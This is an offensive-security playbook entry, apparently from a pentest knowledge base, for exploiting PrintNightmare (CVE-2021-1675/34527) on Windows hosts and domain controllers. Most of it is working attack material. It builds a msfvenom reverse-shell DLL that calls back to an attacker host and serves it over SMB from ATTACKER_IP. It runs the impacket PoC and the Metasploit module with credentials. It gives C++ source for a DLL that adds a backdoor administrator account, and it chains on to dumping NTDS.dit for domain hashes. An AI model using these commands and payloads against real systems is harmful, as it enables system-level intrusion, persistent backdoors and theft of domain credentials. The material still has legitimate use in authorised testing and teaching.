---
id: printnightmare
title: PrintNightmare (CVE-2021-1675 / 34527)
stage: initial-access
tags: [windows]
summary: Exploit Windows Print Spooler RCE to load a malicious DLL as SYSTEM — works on unpatched DCs and workstations with valid credentials.
leads_to:
  - rev-shell
  - system-shell
---

## Prerequisites

Valid domain credentials (any user). Print Spooler service running on the target (`sc query spooler`). Target unpatched (missing KB5004945 or equivalent July 2021 rollup). Port 445 open.

PrintNightmare exploits the Print Spooler's `RpcAddPrinterDriverEx` function to load an arbitrary DLL into the spooler process, which runs as SYSTEM. CVE-2021-1675 is the local privilege escalation variant; CVE-2021-34527 is the remote RCE — the impacket PoC covers the remote path. Domain Controllers commonly have Print Spooler enabled for legacy GPO reasons, making this a direct path to SYSTEM on the DC.

## Quick Win

> Check Spooler is running, generate DLL, run PoC — SYSTEM shell in under 2 minutes.

```bash
# Verify spooler is running
impacket-rpcdump @$TARGET | grep -i "print\|spooler"

# Generate reverse shell DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER LPORT=4444 -f dll -o evil.dll

# Serve via SMB, start listener, run exploit
impacket-smbserver share $(pwd) -smb2support
nc -lvnp 4444
python3 CVE-2021-1675.py domain.local/user:password@$TARGET '\\ATTACKER_IP\share\evil.dll'
```

## Check Spooler Status

> Confirm the service is running before attempting — a stopped spooler means no attack surface.

```bash
# From Linux
impacket-rpcdump @$TARGET | grep -i "print\|spooler"
```

```powershell
# From Windows
sc query spooler
Get-Service -Name Spooler
```

## Impacket Exploit (Remote RCE)

> Full chain: SMB share hosts the DLL, exploit triggers the spooler to load it as SYSTEM.

```bash
# Start SMB server on attacker
impacket-smbserver share $(pwd) -smb2support

# Generate DLL reverse shell payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER LPORT=4444 -f dll -o evil.dll

# Run exploit — loads DLL into C:\Windows\System32\spool\drivers\
python3 CVE-2021-1675.py domain.local/user:password@$TARGET '\\ATTACKER_IP\share\evil.dll'
```

## Metasploit

> One-stop module if you prefer the MSF workflow.

```bash
msfconsole -q
use exploit/windows/dcerpc/cve_2021_1675_printnightmare
set RHOSTS $TARGET
set SMBUser user
set SMBPass password
set SMBDomain domain.local
run
```

## Add Local Admin (Alternative Payload)

> If a reverse shell isn't needed, drop a DLL that adds a backdoor admin account.

```cpp
// Compile: x86_64-w64-mingw32-gcc -shared -o add_user.dll add_user.cpp
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {
    if (reason == DLL_PROCESS_ATTACH)
        system("net user hacker P@ssw0rd! /add && net localgroup Administrators hacker /add");
    return TRUE;
}
```

## Patch Check

> Confirm the target is actually unpatched before spending time on setup.

```powershell
# If none of these hotfixes appear, target is likely unpatched
Get-HotFix | Where-Object {$_.HotFixID -in @('KB5004945','KB5004946','KB5004947')}
```

## Leads To

Successful exploit → DLL runs as SYSTEM → reverse shell as `NT AUTHORITY\SYSTEM` or backdoor admin account. On a DC, SYSTEM access → dump NTDS.dit via `impacket-secretsdump` for all domain hashes → domain-admin. Backdoor account added → RDP in as local admin → full workstation control.
